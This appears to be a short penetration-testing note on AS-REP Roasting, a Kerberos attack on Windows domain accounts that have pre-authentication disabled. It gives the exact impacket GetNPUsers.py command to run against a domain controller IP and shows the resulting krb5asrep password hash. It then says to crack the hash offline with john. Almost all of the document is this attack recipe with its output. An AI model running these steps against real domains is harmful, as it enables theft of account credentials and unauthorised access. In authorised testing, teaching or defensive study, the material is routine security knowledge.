# Windows vulnerability {-}

## ASREPRoasing on Kerberos {-}

If the Kerberos pre-authentication has been disabled for an account, that means that it is vulnerable to ASREPRoasting.
As soon as we have a username, we can use the GetNPUsers script from impacket to retrieve it's password Hash

```bash
GetNPUsers.py domain/username -request -no-pass -dc-ip 10.10.10.11

#OUTPUT
[*] Getting TGT for username
$krb5asrep$23$username@domain:00c4e7b0ce1ad503425a4b0161021fe5$8d8d475c06d1fb191d431055f3dc5cf63e22ebcbb6cdf4a7cb122e
8f16374f221327e13be255eb60df449969b864abf3322c2c69c16738b9cbbd47ff1a67727656d7c7581c0df55280d19d4553c92fe86fb313fd7fb
843bd2e7796183d005edf241d9c89917239f29834ce6595f7359911e427b21a16154e552536dd1e1c66280e240ee9ea6d9d7ca5c462c5abf9a57ca
46db4af7c4a43b4261f5560257c58e6e1cc51ebe742dbeb903a7379ae7e2db8882018922feed8ae18ee799621de5f64bf0c10284e66a5017a2f6a13
b0ff132e99e715ecded126bdbd6347dd93a0cfff96a586fb5682ce5e04b2960b67401854
```

You can then copy the TGT in a file and try to crack it with john


